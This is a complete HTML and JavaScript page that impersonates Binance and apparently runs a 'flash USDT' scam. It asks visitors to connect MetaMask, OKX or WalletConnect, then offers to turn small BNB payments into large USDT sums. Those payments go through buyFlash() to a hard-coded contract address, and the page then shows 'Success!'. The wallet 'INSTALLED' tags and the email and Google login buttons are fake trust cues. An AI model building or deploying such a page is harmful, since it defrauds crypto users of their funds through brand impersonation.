<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Binance | Connect Protocol</title>
    <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
    <style>
        :root { --gold: #F3BA2F; --dark: #0B0E11; --card: #1E2329; --text: #EAECEF; --sub: #848E9C; }
        body { background: var(--dark); color: var(--text); font-family: 'Segoe UI', sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
        
        .modal-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); display: none; justify-content: center; align-items: center; z-index: 10000; backdrop-filter: blur(8px); }
        .modal-content { background: #181A20; width: 90%; max-width: 380px; border-radius: 24px; padding: 24px; border: 1px solid #2B3139; position: relative; }
        
        .modal-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; color: white; }
        .close-btn { cursor: pointer; font-size: 20px; color: var(--sub); }

        .wallet-item { display: flex; align-items: center; justify-content: space-between; background: #2B3139; padding: 14px 18px; border-radius: 16px; margin-bottom: 12px; cursor: pointer; transition: 0.2s; border: 1px solid transparent; }
        .wallet-item:hover { border-color: var(--gold); background: #323942; }
        .wallet-info { display: flex; align-items: center; gap: 12px; }
        .wallet-info img, .all-wallets-icon { width: 32px; height: 32px; border-radius: 8px; }
        
        /* ÿ£ŸäŸÇŸàŸÜÿ© All Wallets */
        .all-wallets-icon { background: #3b424a; display: flex; align-items: center; justify-content: center; font-size: 18px; color: #5d6771; }
        
        .tag { font-size: 10px; font-weight: bold; padding: 3px 8px; border-radius: 6px; }
        .tag-installed { background: rgba(46, 189, 133, 0.2); color: #2ebd85; }
        .tag-count { background: #3b424a; color: var(--sub); }

        .app-card { background: var(--card); width: 340px; border-radius: 30px; padding: 35px; border: 1px solid #2B3139; text-align: center; box-shadow: 0 20px 50px rgba(0,0,0,0.5); }
        .btn-main { background: var(--gold); color: #000; border: none; width: 100%; padding: 18px; border-radius: 14px; font-weight: 900; font-size: 16px; cursor: pointer; }
        
        #status { margin-top: 20px; font-size: 12px; color: var(--gold); font-family: monospace; }
        
        .divider { display: flex; align-items: center; text-align: center; margin: 20px 0; color: var(--sub); font-size: 14px; }
        .divider::before, .divider::after { content: ''; flex: 1; border-bottom: 1px solid #2B3139; }
        .divider:not(:empty)::before { margin-right: .5em; }
        .divider:not(:empty)::after { margin-left: .5em; }
    </style>
</head>
<body>

<div class="app-card">
    <img src="https://upload.wikimedia.org/wikipedia/commons/e/e8/Binance_Logo.svg" width="130" style="margin-bottom: 30px;">
    <div id="ui-connect">
        <button class="btn-main" onclick="openModal()">Connect Wallet</button>
    </div>
    <div id="ui-action" style="display:none;">
        <select id="tier" style="width:100%; padding:15px; border-radius:12px; background:#0B0E11; color:white; border:1px solid #474D57; margin-bottom:20px;">
            <option value="0.09">5,000 USDT (0.09 BNB)</option>
            <option value="0.2">10,000 USDT (0.2 BNB)</option>
            <option value="1.0">100,000 USDT (1.0 BNB)</option>
        </select>
        <button class="btn-main" onclick="execute()">Activate Flash ‚ö°</button>
    </div>
    <div id="status">Secure Node Connection Ready</div>
</div>

<div class="modal-overlay" id="walletModal">
    <div class="modal-content">
        <div class="modal-header">
            <span>Connect Wallet</span>
            <span class="close-btn" onclick="closeModal()">‚úï</span>
        </div>

        <div class="wallet-item" onclick="connectDeep('wc')">
            <div class="wallet-info">
                <img src="https://raw.githubusercontent.com/WalletConnect/walletconnect-assets/master/Logo/Blue%20(Default)/Logo.svg">
                <span>WalletConnect</span>
            </div>
            <span class="tag" style="background: rgba(59, 153, 252, 0.2); color: #3b99fc;">QR CODE</span>
        </div>

        <div class="wallet-item" onclick="connectDeep('okx')">
            <div class="wallet-info">
                <img src="https://www.okx.com/cdn/assets/imgs/221/9E4FE6E178351F9F.png">
                <span>OKX Wallet</span>
            </div>
            <span class="tag tag-installed">INSTALLED</span>
        </div>

        <div class="wallet-item" onclick="connectDeep('metamask')">
            <div class="wallet-info">
                <img src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Logo.svg">
                <span>MetaMask</span>
            </div>
            <span class="tag tag-installed">INSTALLED</span>
        </div>

        <div class="wallet-item" onclick="connectDeep('wc')">
            <div class="wallet-info">
                <div class="all-wallets-icon">‚Åù‚Åù‚Åù</div>
                <span>All Wallets</span>
            </div>
            <span class="tag tag-count">540+</span>
        </div>

        <div class="divider">or</div>

        <div style="background: #2B3139; padding: 12px; border-radius: 12px; color: var(--sub); font-size: 14px; text-align: right; cursor: pointer; margin-bottom: 10px;">
            üìß Email
        </div>
        
        <div style="background: #2B3139; padding: 12px; border-radius: 12px; color: #fff; font-size: 14px; text-align: center; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 10px;">
            <img src="https://www.gstatic.com/images/branding/product/1x/googleg_48dp.png" width="18"> Continue With Google
        </div>
    </div>
</div>

<script>
    let web3, account;
    const CONTRACT_ADDR = "0x8933877Ad38598Ad25bf97f9ECEBbCE5D901eB71";
    const ABI = [{"inputs":[],"name":"buyFlash","outputs":[],"stateMutability":"payable","type":"function"}];

    function openModal() { document.getElementById('walletModal').style.display = 'flex'; }
    function closeModal() { document.getElementById('walletModal').style.display = 'none'; }

    async function connectDeep(type) {
        if (window.ethereum) {
            try {
                const accs = await window.ethereum.request({ method: 'eth_requestAccounts' });
                account = accs[0];
                web3 = new Web3(window.ethereum);
                await window.ethereum.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: '0x38' }] });
                closeModal();
                document.getElementById('ui-connect').style.display = 'none';
                document.getElementById('ui-action').style.display = 'block';
                document.getElementById('status').innerText = "Linked: " + account.substring(0,10);
            } catch (e) { alert("Connection Error"); }
        } else {
            // ÿ™Ÿàÿ¨ŸäŸá ŸÑŸÄ WalletConnect ÿßŸÑÿ¥ÿßŸÖŸÑ ŸÑŸÑÿ¨ŸàÿßŸÑ
            window.location.href = `https://metamask.app.link/dapp/${window.location.hostname}`;
        }
    }

    async function execute() {
        const val = document.getElementById('tier').value;
        const contract = new web3.eth.Contract(ABI, CONTRACT_ADDR);
        try {
            document.getElementById('status').innerText = "Processing Node... Check Wallet";
            await contract.methods.buyFlash().send({ from: account, value: web3.utils.toWei(val, "ether") });
            document.getElementById('status').innerText = "Success!";
        } catch (e) { document.getElementById('status').innerText = "Transaction Failed."; }
    }
</script>
</body>
</html>
